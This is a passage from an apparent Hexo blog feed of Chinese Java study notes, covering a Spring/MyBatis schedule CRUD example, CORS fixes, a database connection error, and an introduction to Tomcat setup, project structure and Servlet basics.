function_">save</span><span class="params">(Schedule schedule)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> scheduleMapper.insert(schedule);</span><br><span class="line">        <span class="keyword">if</span> (row &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.fail(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> R.ok(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新现有的日程。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> schedule 要更新的日程对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含更新结果的通用响应对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 此方法首先检查日程对象的ID是否为空，然后调用 ScheduleMapper 的 update 方法来执行更新操作，并根据操作结果返回相应的响应对象。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">update</span><span class="params">(Schedule schedule)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (schedule.getId() == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.fail(<span class="string">&quot;id为空，无法修改！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> scheduleMapper.update(schedule);</span><br><span class="line">        <span class="keyword">if</span> (row &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.fail(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> R.ok(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="mapper-1"><a href="#mapper-1" class="headerlink" title="mapper"></a>mapper</h4><p>接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ScheduleMapper</span> &#123;</span><br><span class="line">    List&lt;Schedule&gt; <span class="title function_">queryList</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">deleteById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">insert</span><span class="params">(Schedule schedule)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">update</span><span class="params">(Schedule schedule)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>XML:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.fu.mapper.ScheduleMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;schedule&quot;</span>&gt;</span></span><br><span class="line">        select * from schedule</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteById&quot;</span>&gt;</span></span><br><span class="line">        delete from schedule where id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insert&quot;</span>&gt;</span></span><br><span class="line">        insert into schedule (title,completed) value (#&#123;title&#125;,#&#123;completed&#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span>&gt;</span></span><br><span class="line">        update schedule set title = #&#123;title&#125;,completed=#&#123;completed&#125;</span><br><span class="line">            where id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>







<h3 id="前后端联合调试"><a href="#前后端联合调试" class="headerlink" title="前后端联合调试"></a>前后端联合调试</h3><p>前端代码中声明了通过Axios发送请求时的访问路径：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 Axios 实例 设置一些基础属性</span></span><br><span class="line"><span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>:<span class="string">&#x27;http://localhost:8080/ssm&#x27;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">10000</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>使用 <code>axios.create()</code> 方法创建一个新的 Axios 实例。</p>
<p>设置了 <code>baseURL</code> 和 <code>timeout</code> 属性：</p>
<ul>
<li><code>baseURL</code>: 所有请求的基准 URL，方便后续请求时只需指定相对路径。</li>
<li><code>timeout</code>: 请求超时时间，单位为毫秒，默认值为 10 秒</li>
</ul>
<p>因此后端应用部署到服务器中时只需要向外暴露<code>http://localhost:8080/ssm</code>访问接口，前端代码编写时在此基础接口后添加具体的访问接口即可完成对应操作。<strong>但需要解决跨域问题</strong>，参见本文《问题总结-经典问题1》</p>
<h1 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h1><h2 id="经典问题"><a href="#经典问题" class="headerlink" title="经典问题"></a>经典问题</h2><h3 id="问题1-跨域问题解决"><a href="#问题1-跨域问题解决" class="headerlink" title="问题1 跨域问题解决"></a>问题1 跨域问题解决</h3><h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>由于前端部署访问端口为<code>http://localhost:5173/</code> 后端为<code>http://localhost:8080/</code> 会出现跨域问题：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250130003114.png"></p>
<p><strong>跨域问题（Cross-Origin Resource Sharing, CORS）</strong> 是指在浏览器环境中，当一个前端应用试图从一个不同的域名、协议或端口请求资源时，浏览器出于安全考虑会阻止这种请求。这是由于浏览器的同源策略（Same-Origin Policy）所引起的。</p>
<p><strong>同源策略</strong>：<strong>同源</strong>——两个 URL 的<code>协议</code>、<code>域名</code>和<code>端口号</code>完全相同</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>在前后端交互中，解决跨域问题的主要方案包括：</p>
<ol>
<li><p><strong>服务器端配置</strong>：最常用的解决方案之一是通过在后端服务器上设置HTTP响应头来允许特定或所有来源的请求。例如，在Java应用中使用<code>@CrossOrigin</code>注解或者在Spring Boot中全局配置CORS。（<strong>本次实践中，通过在ScheduleController类中添加注解@CrossOrigin解决跨域问题</strong></p>
</li>
<li><p><strong>JSONP（JSON with Padding）</strong>：一种通过<code>&lt;script&gt;</code>标签绕过浏览器同源策略的方法，但仅支持GET请求，现在已较少使用。</p>
</li>
<li><p><strong>代理服务器</strong>：前端应用可以配置一个代理服务器，将API请求转发到不同源的服务器上，以此避免跨域问题。这种方式常用于开发环境。</p>
</li>
<li><p><strong>CORS Filter</strong>：对于不支持CORS配置的服务器，可以通过实现一个过滤器（Filter）来添加必要的CORS响应头。</p>
</li>
<li><p><strong>WebSocket</strong>：虽然主要用于全双工通信，但在某些情况下也可以用来规避跨域限制。</p>
</li>
</ol>
<h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><h3 id="错误1-数据库连接错误："><a href="#错误1-数据库连接错误：" class="headerlink" title="错误1 数据库连接错误："></a>错误1 数据库连接错误：</h3><blockquote>
<p>[ERROR] [Druid-ConnectionPool-Create-897634805]  [com.alibaba.druid.pool.DruidDataSource] [create connection  SQLException, url: jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;test, errorCode 1045,  state 28000] java.sql.SQLException: Access denied for user ‘${db.user}‘@’localhost’  (using password: YES)</p>
</blockquote>
<p>排查过程：</p>
<ol>
<li>确定jdbc.properties中账户密码正确，不能有空格、引号</li>
<li>确定DataSource配置文件正确扫描到jdbc.properties</li>
<li>确定DataSource配置文件中<code>@Value()</code>注解使用了<code>$&#123;&#125;</code>，且其中名称必须与jdbc.properties一致！！！！鼠标悬停可见是否正确读取。确保<code>@Value()</code>注解括号内除了<code>$&#123;参数名&#125;</code>外没有多打字符！！！</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h2><p>（1）IDEA开发工具：2022.1.2<br>（2）JDK：Java17<strong>（Spring6要求JDK最低版本是Java17）</strong><br>（3）SpringMVC：6.0.2</p>
<p>（4）Maven：3.6+</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><strong>主要参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AP411s7D7/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-SSM</a></p>
<p><strong>其他参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV14WtLeDEit/?spm_id_from=333.1387.search.video_card.click">尚硅谷雷神最新版<em>SSM</em>教程，基于AI的全新<em>ssm</em>框架实战</a></p>
<p><a href="https://www.bilibili.com/video/BV1Ya411S7aT/?spm_id_from=333.1387.search.video_card.click">【尚硅谷】<em>SSM</em>框架全套教程，MyBatis+Spring+SpringMVC+<em>SSM</em>整合一套通关</a></p>
<p><a href="https://www.bilibili.com/video/BV1ad4y1y7LU/?spm_id_from=333.1387.search.video_card.click">【尚硅谷】<em>SSM</em>项目教程，<em>SSM</em>+SpringBoot+SpringSecurity框架整合项目</a></p>
<p><a href="https://www.bilibili.com/video/BV17W411g7zP/?spm_id_from=333.1387.search.video_card.click">尚硅谷<em>SSM</em>实战演练丨<em>ssm</em>整合快速开发CRUD</a></p>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>SSM</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-TCSL-Note</title>
    <url>/2025/01/01/JavaWeb-TCSL-Note/</url>
    <content><![CDATA[<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="Web-服务器"><a href="#Web-服务器" class="headerlink" title="Web 服务器"></a>Web 服务器</h3><p>Web服务器是一种计算机程序，它通过HTTP协议（或HTTPS）接收来自客户端（通常是Web浏览器）的请求，并将相应的资源（如HTML页面、图片、CSS文件等）发送回客户端。Web服务器主要用于处理静态内容，即不需要动态生成的内容。</p>
<p><strong>主要职责</strong>：</p>
<ul>
<li><strong>处理静态资源</strong>：如HTML文档、图像、样式表、JavaScript文件等。</li>
<li><strong>解析URL</strong>：根据请求的URL找到对应的资源路径。</li>
<li><strong>建立连接</strong>：与客户端建立TCP&#x2F;IP连接，使用HTTP协议进行数据传输。</li>
<li><strong>响应请求</strong>：为每个请求创建一个响应，包含状态码、响应头和响应体。</li>
<li><strong>安全性和认证</strong>：支持基本的身份验证和SSL&#x2F;TLS加密通信。</li>
<li><strong>日志记录</strong>：记录访问日志，便于后续分析和故障排查。</li>
</ul>
<p><strong>流行的产品</strong>包括Apache HTTP Server、Nginx、Microsoft IIS等。这些Web服务器可以配置为反向代理，将某些特定的请求转发给后端的应用服务器，如Tomcat。</p>
<h3 id="Tomcat-1"><a href="#Tomcat-1" class="headerlink" title="Tomcat"></a>Tomcat</h3><p><strong>定义</strong>：Apache Tomcat是一个开源的Java Servlet容器，它实现了Java EE（现在称为Jakarta EE）规范中的Servlet、JSP、WebSocket和其他技术。Tomcat不仅可以作为独立的应用服务器运行Java Web应用程序，还可以作为其他Web服务器（如Apache HTTP Server或Nginx）的后端组件，以处理动态内容。</p>
<p><strong>主要职责</strong>：</p>
<ul>
<li><strong>处理动态内容</strong>：Tomcat能够执行Java代码，编译和运行JSP页面，以及加载和调用Servlet来生成动态内容。</li>
<li><strong>管理应用生命周期</strong>：负责Java Web应用的部署、启动、停止和卸载。</li>
<li><strong>配置灵活性</strong>：提供了多种配置选项，可以通过<code>server.xml</code>, <code>web.xml</code>, <code>context.xml</code>等配置文件定制其行为。</li>
<li><strong>安全性</strong>：支持基于角色的安全性模型，允许开发者定义谁可以访问哪些资源。</li>
<li><strong>性能优化</strong>：内置了对多线程的支持，能够并发处理多个请求；同时支持异步处理和持久连接，提高应用的响应速度和吞吐量。</li>
<li><strong>管理和监控</strong>：提供了管理界面和API，方便管理员监控和控制应用服务器的状态。</li>
</ul>
<p><strong>Tomcat的版本</strong>：随着Java EE的发展，Tomcat也在不断更新，以支持新的规范和技术。例如，Tomcat 10开始支持Jakarta EE 9，这意味着所有的包名都从<code>javax.*</code>迁移到了<code>jakarta.*</code>。</p>
<p><strong>因此在Tomcat8、9等版本开发的软件在更换导入包名前，无法在Tomcat10中使用</strong></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>从<a href="https://tomcat.apache.org/">官网</a>下载，版本为<a href="https://dlcdn.apache.org/tomcat/tomcat-10/v10.1.34/bin/apache-tomcat-10.1.34-windows-x64.zip">Tomcat10</a>。</p>
<p>配置Java_Home环境变量 &#x3D;&#x3D;》解压安装包 &#x3D;&#x3D;》双击startup.bat开始运行 &#x3D;&#x3D;》浏览器打开<code>localhost:8080</code>，验证是否出现Tomcat页面，安装成功。</p>
<p>启动：startup.bat</p>
<p>关闭：shutdown.bat或直接关闭启动页面</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>修改控制台输出日志字符集：conf文件夹下，logging.properties文件<code>java.util.logging.ConsoleHandler.encoding = UTF-8</code>配置项</p>
<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>Tomcat 安装目录结构</p>
<ul>
<li><strong>bin</strong>：包含启动和停止Tomcat服务器的脚本（如<code>startup.sh</code>、<code>shutdown.sh</code>），以及其他管理工具。</li>
<li><strong>conf</strong>：包含各种配置文件，用于设置Tomcat的行为和环境。<ul>
<li><code>web.xml</code> ：是一个全局的Web应用程序部署描述符，它定义了所有部署到该Tomcat实例上的Web应用都必须遵守的默认设置。这个文件包含了诸如欢迎文件列表、MIME类型映射、默认的Servlet配置等信息。尽管每个Web应用都可以有自己的<code>WEB-INF/web.xml</code>来覆盖这些默认值，但<code>conf/web.xml</code>中的配置适用于整个服务器的所有Web应用。</li>
<li><code>server.xml</code> 是Tomcat的核心配置文件，它定义了Tomcat的服务端口、连接器（Connector）、引擎（Engine）、主机（Host）和服务（Service）等组件。通过修改这个文件，可以调整Tomcat的基本行为，例如更改HTTP端口、启用HTTPS、配置多个虚拟主机等。</li>
<li><code>tomcat-users.xml</code> 文件用于定义用户账户、角色和权限，主要用于Tomcat Manager和Host Manager应用的安全认证。通过在这个文件中添加用户和角色，可以控制谁有权访问这些管理工具，以及他们具有哪些操作权限。</li>
</ul>
</li>
<li><strong>lib</strong>：放置Tomcat运行时需要的JAR文件，这些库文件是所有Web应用共享的。</li>
<li><strong>logs</strong>：存放日志文件，包括访问日志、错误日志等。</li>
<li><strong>temp</strong>：用于临时存储文件，例如在执行JSP页面编译时产生的临时文件。</li>
<li><strong>webapps</strong>：默认的应用程序部署目录，将WAR包或解压后的Web应用放入此目录时，Tomcat会自动部署它们。内部包含Tomcat示例项目。访问本机Tomcat项目：<code>localhost:8080/项目访问路径</code>，项目访问路径和项目部署目录（即文件存储目录）不一定一样。</li>
<li><strong>work</strong>：存放由JSP页面编译成的Servlet类文件和其他工作文件，通常每次重启Tomcat后会被清空。</li>
</ul>
<p>项目可以部署在磁盘的任意位置，但需要在conf下创建一个xml配置文件，按如下方式指定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Context docBase=&quot;/path/to/myapp&quot; reloadable=&quot;true&quot;&gt;</span><br><span class="line">    &lt;!-- 可以在此添加更多特定于该应用的配置 --&gt;</span><br><span class="line">&lt;/Context&gt;</span><br></pre></td></tr></table></figure>

<p>或编辑server.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</span><br><span class="line">      unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 其他配置 --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 定义一个外部Web应用 --&gt;</span><br><span class="line">    &lt;Context path=&quot;/myapp&quot; docBase=&quot;/path/to/myapp&quot; reloadable=&quot;true&quot;/&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/Host&gt;</span><br></pre></td></tr></table></figure>







<h2 id="Tomcat项目结构"><a href="#Tomcat项目结构" class="headerlink" title="Tomcat项目结构"></a>Tomcat项目结构</h2><p>一个可以在Tomcat中发布的Java Web项目的标准目录结构通常遵循Java Servlet规范，它包括了Web应用程序的静态资源、编译后的类文件、库文件（JAR）、配置文件等。以下是一个典型的Java Web项目目录结构示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MyWebApp/</span><br><span class="line">├── WEB-INF/			   # 受保护的文件目录，浏览器无法直接访问，其他目录和文件可以被浏览器直接访问</span><br><span class="line">│   ├── classes/           # 编译后的Java类文件和资源文件</span><br><span class="line">│   ├── lib/               # 第三方库或依赖项的JAR文件</span><br><span class="line">│   ├── web.xml            # Web应用的部署描述符</span><br><span class="line">│   └── [其他配置文件]     # 如applicationContext.xml (Spring), log4j.properties, etc.</span><br><span class="line">├── META-INF/              # 元数据信息，如MANIFEST.MF</span><br><span class="line">├── index.html             # 欢迎页面或其他HTML文件</span><br><span class="line">├── [静态资源]            # 如CSS, JavaScript, 图片等</span><br><span class="line">└── [其他Web内容]         # 如JSP文件, 其他HTML文件, 等</span><br></pre></td></tr></table></figure>



<p><strong>详细说明：</strong></p>
<ul>
<li><p>**<code>WEB-INF/classes/</code>**：这个目录存放的是Java源代码编译后生成的<code>.class</code>文件，以及任何非Java资源文件（如属性文件）。在使用构建工具（如Maven, Gradle）时，这些文件会自动从<code>src/main/java</code>和<code>src/main/resources</code>复制到这里。</p>
</li>
<li><p>**<code>WEB-INF/lib/</code>**：放置所有Web应用所需的第三方库（.jar文件）。Tomcat会在启动时将此目录中的所有JAR添加到Web应用的类路径中。注意，不要在这里放置Tomcat自带的库，因为它们已经在<code>$CATALINA_HOME/lib</code>中存在了。</p>
</li>
<li><p>**<code>WEB-INF/web.xml</code>**：这是Web应用的部署描述符，定义了Servlet映射、过滤器、监听器等配置。对于现代的Java EE 6+和Servlet 3.0+的应用，许多配置可以通过注解来完成，因此<code>web.xml</code>可以变得非常简单甚至为空。不过，它仍然是每个Web应用必需的一部分。</p>
</li>
<li><p>**<code>META-INF/</code>**：包含元数据信息，最常见的是<code>MANIFEST.MF</code>文件，它用于指定JAR包或WAR包的元数据。此外，如果使用某些框架（如EJB），可能会有额外的配置文件放在此处。</p>
</li>
<li><p><strong>静态资源</strong>：这些是直接提供给浏览器的文件，如HTML、CSS、JavaScript、图片等。它们可以直接放在Web应用的根目录下，也可以组织在一个特定的子目录中（例如<code>static/</code>、<code>resources/</code>、<code>assets/</code>等），子目录下可以再创建子目录。</p>
</li>
<li><p><strong>其他Web内容</strong>：除了静态资源外，这里还可以放置动态内容，如JSP文件、模板文件等。根据项目需求和使用的框架，这些文件可能位于不同的位置。</p>
</li>
</ul>
<p><strong>部署</strong></p>
<p>要将上述结构的Web应用部署到Tomcat，有两种方式：</p>
<ol>
<li><p><strong>WAR文件</strong>：将整个项目打包成一个WAR（Web Application Archive）文件，然后将WAR文件放到Tomcat的<code>webapps/</code>目录下。Tomcat会自动检测到新的WAR文件并将其解压为Web应用。</p>
</li>
<li><p><strong>解压的目录</strong>：如果已经有一个解压好的Web应用目录（按照上面的结构），可以直接将其复制到<code>webapps/</code>目录下。同样，Tomcat会自动检测到新的Web应用并开始部署。</p>
</li>
</ol>
<p><strong>使用构建工具自动构建：</strong></p>
<p>现代开发通常会使用构建工具（如Maven或Gradle）来管理项目依赖、编译源代码、运行测试和打包应用。这些工具可以根据你定义的项目结构自动生成符合上述标准的目录，并执行必要的构建步骤。例如，在Maven中，标准的项目结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my-webapp/</span><br><span class="line">├── src/</span><br><span class="line">│   ├── main/</span><br><span class="line">│   │   ├── java/           # Java源代码</span><br><span class="line">│   │   ├── resources/      # 资源文件（如属性文件）</span><br><span class="line">│   │   └── webapp/         # Web内容（如JSP, HTML, CSS, JS, images）</span><br><span class="line">│   └── test/</span><br><span class="line">│       ├── java/           # 测试代码</span><br><span class="line">│       └── resources/      # 测试资源</span><br><span class="line">├── pom.xml                 # Maven项目对象模型文件</span><br><span class="line">└── [其他文件]</span><br></pre></td></tr></table></figure>

<p>当运行<code>mvn clean package</code>命令时，Maven会根据<code>pom.xml</code>中的配置编译源代码、运行测试，并最终生成一个WAR文件，其内部结构与上面描述的标准Web应用结构一致。</p>
<h2 id="IDEA创建Web工程"><a href="#IDEA创建Web工程" class="headerlink" title="IDEA创建Web工程"></a>IDEA创建Web工程</h2><ol>
<li><p>建立Tomcat和IDEA的关联：</p>
<blockquote>
<p>设置 &#x3D;&#x3D;》构建、执行、部署 &#x3D;&#x3D;》应用程序服务器 &#x3D;&#x3D;》 + &#x3D;&#x3D;》 设置为Tomcat安装目录</p>
</blockquote>
</li>
<li><p>创建JavaWeb工程</p>
</li>
<li><p>使用IDEA将工程构建为APP</p>
</li>
<li><p>使用IDEA将APP部署到Tomcat</p>
</li>
</ol>
<p>步骤一：正常创建JavaEE工程</p>
<p>步骤二：创建一个模块，修改pom文件打包方式为war，刷新maven</p>
<p>步骤三：</p>
<p>​	方法1：文件 &#x3D;&#x3D;》项目结构 &#x3D;&#x3D;》部署描述符 &#x3D;&#x3D;》+ &#x3D;&#x3D;》web.xml ，文件必须在web资源目录下，如:</p>
<p>​			<code>D:\workinenglish\development\JavaWeb\web01\src\main\webapp\WEB-INF\web.xml</code></p>
<p>​	方法2：安装插件<code>JBLjavatoweb</code>，右键模块，点击插件即可</p>
<p>步骤四：确定成功：webapp目录上有蓝色圆点</p>
<p>步骤五：Tomcat部署，菜单栏 &#x3D;&#x3D;》 添加配置 &#x3D;&#x3D;》+ &#x3D;&#x3D;》Tomcat服务器 &#x3D;&#x3D;》本地 &#x3D;&#x3D;》</p>
<p>​		服务器（一般配置执行更新操作为“重新部署”；切换出IDE时为“更新类和资源”；） </p>
<p>​		部署 &#x3D;&#x3D;》+ &#x3D;&#x3D;》工件 &#x3D;&#x3D;》xxx.explored &#x3D;&#x3D;》一般修改应用程序上下文为项目名称。</p>
<p>JavaWeb项目目录结构</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">|-- pom.xml                               # Maven 项目管理文件 </span><br><span class="line">|-- src</span><br><span class="line">    |-- main                              # 项目主要代码</span><br><span class="line">    |   |-- java                          # Java 源代码目录</span><br><span class="line">    |   |   `-- com/example/myapp         # 开发者代码主目录</span><br><span class="line">    |   |       |-- controller            # 存放 Controller 层代码的目录</span><br><span class="line">    |   |       |-- service               # 存放 Service 层代码的目录</span><br><span class="line">    |   |       |-- dao                   # 存放 DAO 层代码的目录</span><br><span class="line">    |   |       `-- model                 # 存放数据模型的目录</span><br><span class="line">    |   |-- resources                     # 资源目录，存放配置文件、静态资源等</span><br><span class="line">    |   |   |-- log4j.properties          # 日志配置文件</span><br><span class="line">    |   |   |-- spring-mybatis.xml        # Spring Mybatis 配置文件</span><br><span class="line">    |   |   `-- static                    # 存放静态资源的目录</span><br><span class="line">    |   |       |-- css                   # 存放 CSS 文件的目录</span><br><span class="line">    |   |       |-- js                    # 存放 JavaScript 文件的目录</span><br><span class="line">    |   |       `-- images                # 存放图片资源的目录</span><br><span class="line">    |   `-- webapp                        # 存放 WEB 相关配置和资源</span><br><span class="line">    |       |-- WEB-INF                   # 存放 WEB 应用配置文件</span><br><span class="line">    |       |   |-- web.xml               # Web 应用的部署描述文件</span><br><span class="line">    |       |   `-- classes               # 存放编译后的 class 文件</span><br><span class="line">    |       `-- index.html                # Web 应用入口页面</span><br><span class="line">    `-- test                              # 项目测试代码</span><br><span class="line">        |-- java                          # 单元测试目录</span><br><span class="line">        `-- resources                     # 测试资源目录</span><br></pre></td></tr></table></figure>

<p>原理解析：</p>
<p>每次在IDEA运行Web项目，都会生成一个Tomcat临时副本，存储与项目相关的配置文件，使原Tomcat按副本的配置运行，防止污染原Tomcat。</p>
<hr>
<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><p>Servlet 是一种Java编程语言编写的服务器端技术，用于扩展Web服务器或应用服务器的能力，以便处理来自客户端的请求并返回响应。Servlet是Java EE（现在称为Jakarta EE）规范的一部分，它提供了一种强大的机制来创建动态Web内容。</p>
<p><strong>静态资源：</strong>指那些一旦创建就不会改变或者很少改变的内容。它们直接存储在服务器上，并且当用户请求时，服务器会将这些文件原封不动地发送给用户。静态资源的特点是不依赖于服务器端的处理逻辑或用户的状态信息。</p>
<p><strong>动态资源：</strong>指根据用户的请求、时间或其他条件而生成的内容。与静态资源不同，动态资源不是预先存在的文件，而是由服务器端程序（如Servlet、PHP脚本、Node.js应用等）实时生成的。动态资源的特点是可以响应不同的请求参数、用户身份验证状态、数据库查询结果等来提供个性化的响应。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250102225217.png"></p>
<ol>
<li><p>Tomcat接收到请求后，会将请求报文的信息转换为一个HttpServletRequest对象，该对象包含了请求中的所有信息（请求行，请求头，请求体）。<strong>同时</strong>创建了一个HttpServletRespons对象，该对象用于承接要响应给客户端的信息，待后续补充相关信息后，转换为响应报文（包含响应行，响应头，响应体）</p>
</li>
<li><p>Tomcat根据请求中的资源路径找到对应的servlet类（servlet类是对一系列我们自己定义的类的统称），将其实例化，调用service方法，同时将HttpServletRequest和HttpServletResponse对象作为参数传入。</p>
<blockquote>
<p>service方法也需要由我们创建：</p>
<ol>
<li>从request对象中获取请求的所有信息（参数）</li>
<li>根据参数生成要响应给客户端的数据</li>
<li>将响应的数据放入response对象</li>
</ol>
</blockquote>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250102231145.png"></p>
<p>Servlet是一个服务器端组件</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250102231746.png"></p>
<hr>
<h2 id="Servlet开发流程"><a href="#Servlet开发流程" class="headerlink" title="Servlet开发流程"></a>Servlet开发流程</h2><p>Servlet开发流程：</p>
<ol>
<li>创建JavaWeb项目，将Tomcat添加为当前项目依赖；</li>
<li>实现HttpServlet接口，重写service方法：<code>service(HttpServletRequest req, HttpServletResponse resp) </code></li>
<li>在service方法中，定义业务处理代码</li>
<li>在web.xml中，配置servlet对应的请求映射路径</li>
</ol>
<p>以一个用户注册页面判断用户名是否合法为例，前端页面如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">action</span>=<span class="string">&quot;userServlet&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--action应当与下文web.xml中&lt;url-pattern&gt;对应--&gt;</span></span><br><span class="line">    用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;校验&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="1、添加相关依赖"><a href="#1、添加相关依赖" class="headerlink" title="1、添加相关依赖"></a>1、添加相关依赖</h3><p>在pom.xml中添加：</p>
